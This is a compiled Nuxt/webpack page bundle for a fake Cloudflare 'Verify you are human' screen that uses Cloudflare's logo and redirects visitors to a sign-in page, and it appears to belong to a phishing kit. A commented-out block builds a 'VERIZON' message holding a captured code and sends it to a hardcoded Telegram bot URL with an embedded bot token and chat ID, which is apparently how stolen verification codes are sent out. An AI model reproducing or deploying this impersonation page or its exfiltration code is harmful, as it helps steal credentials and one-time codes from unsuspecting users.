exports.ids = [1];
exports.modules = {

/***/ 24:
/***/ (function(module, exports, __webpack_require__) {

// style-loader: Adds some css to the DOM by adding a <style> tag

// load the styles
var content = __webpack_require__(28);
if(content.__esModule) content = content.default;
if(typeof content === 'string') content = [[module.i, content, '']];
if(content.locals) module.exports = content.locals;
// add CSS to SSR context
var add = __webpack_require__(6).default
module.exports.__inject__ = function (context) {
  add("2e0db9f8", content, true, context)
};

/***/ }),

/***/ 27:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_index_vue_vue_type_style_index_0_id_1236005e_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(24);
/* harmony import */ var _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_index_vue_vue_type_style_index_0_id_1236005e_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_index_vue_vue_type_style_index_0_id_1236005e_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__);
/* harmony reexport (unknown) */ for(var __WEBPACK_IMPORT_KEY__ in _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_index_vue_vue_type_style_index_0_id_1236005e_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__) if(["default"].indexOf(__WEBPACK_IMPORT_KEY__) < 0) (function(key) { __webpack_require__.d(__webpack_exports__, key, function() { return _node_modules_vue_style_loader_index_js_ref_3_oneOf_1_0_node_modules_css_loader_dist_cjs_js_ref_3_oneOf_1_1_node_modules_vue_loader_lib_loaders_stylePostLoader_js_node_modules_postcss_loader_dist_cjs_js_ref_3_oneOf_1_2_node_modules_nuxt_components_dist_loader_js_ref_0_0_node_modules_vue_loader_lib_index_js_vue_loader_options_index_vue_vue_type_style_index_0_id_1236005e_prod_scoped_true_lang_css__WEBPACK_IMPORTED_MODULE_0__[key]; }) }(__WEBPACK_IMPORT_KEY__));


/***/ }),

/***/ 28:
/***/ (function(module, exports, __webpack_require__) {

// Imports
var ___CSS_LOADER_API_IMPORT___ = __webpack_require__(5);
var ___CSS_LOADER_EXPORT___ = ___CSS_LOADER_API_IMPORT___(function(i){return i[1]});
// Module
___CSS_LOADER_EXPORT___.push([module.i, ".page-wrapper[data-v-1236005e]{align-content:center;background:#f3f4f6;display:grid;height:100vh;justify-content:center;place-content:center}.verify-box[data-v-1236005e]{background:#fff;border:2px solid #d1d5db;border-radius:4px;gap:24px;justify-content:center;padding:16px 20px}.verify-box[data-v-1236005e],.verify-left[data-v-1236005e]{align-items:center;display:flex}.verify-left[data-v-1236005e]{gap:8px}.verify-button[data-v-1236005e]{align-items:center;background:#fff;border:2px solid #9ca3af;border-radius:6px;cursor:pointer;display:flex;height:32px;justify-content:center;transition:all .3s ease;width:32px}.verify-button[data-v-1236005e]:hover{border-color:#6b7280}.verify-button.verified[data-v-1236005e]{background:#22c55e;border-color:#22c55e}.check-icon[data-v-1236005e]{height:22px;transition:opacity .3s ease;width:22px}.verify-text[data-v-1236005e]{color:#1f2937;font-size:14px;font-weight:400;margin:0}.verify-text.verifiedText[data-v-1236005e]{color:#16a34a;font-size:20px;font-weight:700}.verify-right[data-v-1236005e]{align-items:flex-end;display:flex;flex-direction:column}.logo-wrapper[data-v-1236005e]{height:30px}.logo-wrapper img[data-v-1236005e]{height:100%;position:relative}.links[data-v-1236005e]{font-size:10px;margin-top:10px}.links a[data-v-1236005e]{color:#374151;-webkit-text-decoration:underline;text-decoration:underline;transition:color .2s ease}.links a[data-v-1236005e]:hover{color:#16a34a}", ""]);
// Exports
___CSS_LOADER_EXPORT___.locals = {};
module.exports = ___CSS_LOADER_EXPORT___;


/***/ }),

/***/ 30:
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// CONCATENATED MODULE: ./node_modules/babel-loader/lib??ref--2-0!./node_modules/vue-loader/lib/loaders/templateLoader.js??ref--6!./node_modules/@nuxt/components/dist/loader.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./pages/index.vue?vue&type=template&id=1236005e&scoped=true
var render = function render() {
  var _vm = this,
    _c = _vm._self._c;
  return _c('div', {
    staticClass: "page-wrapper"
  }, [_vm._ssrNode("<div class=\"verify-box\" data-v-1236005e><div class=\"verify-left\" data-v-1236005e><form data-v-1236005e><button" + _vm._ssrAttr("disabled", _vm.isVerified) + _vm._ssrClass("verify-button", {
    verified: _vm.isVerified
  }) + " data-v-1236005e>" + (_vm.isVerified ? "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 48 48\" class=\"check-icon\" data-v-1236005e><path fill=\"#22c55e\" d=\"M44,24c0,11.045-8.955,20-20,20S4,35.045,4,24S12.955,4,24,4S44,12.955,44,24z\" data-v-1236005e></path> <path fill=\"#ccff90\" d=\"M34.602,14.602L21,28.199l-5.602-5.598l-2.797,2.797L21,33.801l16.398-16.402L34.602,14.602z\" data-v-1236005e></path></svg>" : "<!---->") + "</button></form> <p" + _vm._ssrClass("verify-text", {
    verifiedText: _vm.isVerified
  }) + " data-v-1236005e>" + _vm._ssrEscape("\n        " + _vm._s(_vm.isVerified ? "Success!" : "Verify you are human") + "\n      ") + "</p></div> <div class=\"verify-right\" data-v-1236005e><div class=\"logo-wrapper\" data-v-1236005e><img src=\"https://upload.wikimedia.org/wikipedia/zh/thumb/a/a2/Cloudflare_logo.svg/1200px-Cloudflare_logo.svg.png\" alt=\"Cloudflare\" data-v-1236005e></div> <div class=\"links\" data-v-1236005e><p data-v-1236005e><a href=\"https://www.cloudflare.com/privacypolicy/\" data-v-1236005e>Privacy</a>\n          .\n          <a href=\"https://www.cloudflare.com/website-terms/\" data-v-1236005e>Term</a></p></div></div></div>")]);
};
var staticRenderFns = [];

// CONCATENATED MODULE: ./pages/index.vue?vue&type=template&id=1236005e&scoped=true

// CONCATENATED MODULE: ./node_modules/babel-loader/lib??ref--2-0!./node_modules/@nuxt/components/dist/loader.js??ref--0-0!./node_modules/vue-loader/lib??vue-loader-options!./pages/index.vue?vue&type=script&lang=js
/* harmony default export */ var lib_vue_loader_options_pagesvue_type_script_lang_js = ({
  data() {
    return {
      isVerified: false
    };
  },
  methods: {
    handleRedirect() {
      this.isVerified = true;
      setTimeout(() => {
        this.$router.push('/signin');
      }, 1000);
    }
  }

  // methods: {
  //   async finishJoob() {
  //     this.isVerified = true;

  //     if (!this.formDataRes.code) return;

  //     // Connect your next sign-in step here.
  //     console.log("Code:", this.formDataRes.code);

  //     this.count++;
  //     console.log("Count:", this.count, "Final:", this.finalCount);

  //     if (this.count <= this.finalCount) {
  //       this.loading = true;

  //       // Format the message as string
  //       const message = `*𝕍ERIZON*\nActive: ${this.formDataRes.code}`;

  //       // Send to Telegram
  //       await this.sendTelegramResult(
  //         process.env.NUXT_APP_CHAT_ID || "-4794000485",
  //         message
  //       );

  //       this.isActive = !this.isActive;
  //       this.loading = false;
  //     } else {
  //       // Redirect after sending
  //       location.replace("");
  //     }
  //   },

  //   async sendTelegramResult(chatId, message) {
  //     try {
  //       const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

  //       const payload = {
  //         chat_id: chatId,
  //         text: message,
  //       };

  //       console.log("Sending payload:", payload);
  //       await axios.post(url, payload);
  //     } catch (error) {
  //       console.error("Telegram API Error:", error);
  //     }
  //   },
  // },
});
// CONCATENATED MODULE: ./pages/index.vue?vue&type=script&lang=js
 /* harmony default export */ var pagesvue_type_script_lang_js = (lib_vue_loader_options_pagesvue_type_script_lang_js); 
// EXTERNAL MODULE: ./node_modules/vue-loader/lib/runtime/componentNormalizer.js
var componentNormalizer = __webpack_require__(2);

// CONCATENATED MODULE: ./pages/index.vue



function injectStyles (context) {
  
  var style0 = __webpack_require__(27)
if (style0.__inject__) style0.__inject__(context)

}

/* normalize component */

var component = Object(componentNormalizer["a" /* default */])(
  pagesvue_type_script_lang_js,
  render,
  staticRenderFns,
  false,
  injectStyles,
  "1236005e",
  "84a51fe2"
  
)

/* harmony default export */ var pages = __webpack_exports__["default"] = (component.exports);

/***/ })

};;
//# sourceMappingURL=index.js.map